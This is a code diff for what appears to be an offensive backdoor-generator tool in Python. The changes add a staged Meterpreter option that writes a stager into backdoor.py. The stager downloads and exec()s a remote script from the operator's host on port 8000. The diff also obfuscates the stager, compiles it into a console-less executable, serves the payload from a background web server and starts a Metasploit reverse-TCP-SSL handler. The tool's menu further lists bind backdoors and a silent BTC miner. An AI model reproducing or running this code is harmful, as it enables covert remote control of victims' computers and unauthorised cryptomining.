@@ -12,6 +12,9 @@ import string
 from ripgrok import get_tunnels
 import random
 from pickle import GLOBAL
+import subprocess
+
+
 
 bind = 0
 ## RandomVariables
@@ -150,6 +153,8 @@ def logo():
     print(random.choice(logolist))
 
 
+def move_file_to_directory(file_path, destination_directory):
+    shutil.move(file_path, destination_directory)
 clear = lambda: os.system("clear")
 clear()
 logo()
@@ -552,6 +557,12 @@ def postgen():
             print(logo)
             print('Backdoor saved under "dist" folder')
 
+def start_web_server(webroot):
+    command = ["python3", "-m", "http.server", "--directory", webroot]
+
+    # Start the web server as a background process
+    subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
 
 def rep_syst():
     hide = input(
@@ -713,16 +724,39 @@ def cleanup():
     except FileNotFoundError:
         pass
 
+def webdelivery():
+    with open ("backdoor.py","a+") as outs:
+        specf="destin='http://"+host+":8000/ocr_or.py'"
+        websc= """
+import requests
+import subprocess
+import time
+import random
+def download_and_run_script(url):
+    response = requests.get(url)
+    script_content = response.text
+    exec(script_content)
 
+script_url = destin
+download_and_run_script(script_url)
+        """
+        outs.write(specf)
+        outs.write(websc)
+    import obfuscator
+    obfuscator.MainMenu("backdoor.py")
+    os.system("python3 -m nuitka --standalone --include-module=sandboxed --disable-console --onefile --assume-yes-for-downloads backdoor_or.py")
 print(
     """
     
         1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
         2. Create Encrypted TCP Meterpreter (can embed in other script) (recommended)
-        3. Create Obfuscated file with custom code
+        3. Crypt custom code
         ##########################################################################################
                                                 Miners
         4. Create a silent BTC miner
+        ##########################################################################################
+                                            Staged Payloads
+        5. Create Encrypted Meterpreter (staged)
         
 """
 )
@@ -821,5 +855,45 @@ if nscan == "4":
             print('Miner saved under "dist" folder')
     print("You can monitor your `miners` here : https://solo.ckpool.org/")
     cleanup()
+if nscan == "5":
+    clear()
+    logo()
+    print(
+        "##########################################################################################"
+    )
+    print("Generating")
+    gen_rev_ssl_tcp()
+    clear()
+    logo()
+    print(
+        "##########################################################################################"
+    )
+
+
+    b = "".join(
+        secrets.choice(string.ascii_uppercase + string.ascii_lowercase)
+        for i in range(13)
+    )
+
+    encrypted = True
+    import obfuscator
+
+    obfuscator.MainMenu(name)
+    file_path = "ocr_or.py"
+    destination_directory = "webroot"
+    move_file_to_directory(file_path, destination_directory)
+    webdelivery()
+    webroot = "webroot"
+    start_web_server(webroot)
+    print("web server started in the beackground on port 8000. the backdoor is saved as backdoor_or.py and if you have compiled it it will be in the nuitka folder")
+    print("wait...")
+    a = (
+            "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "
+            + port
+            + "; exploit'"
+        )
+    os.system(a)
+
+
 else:
     print("Please select a vaild option")
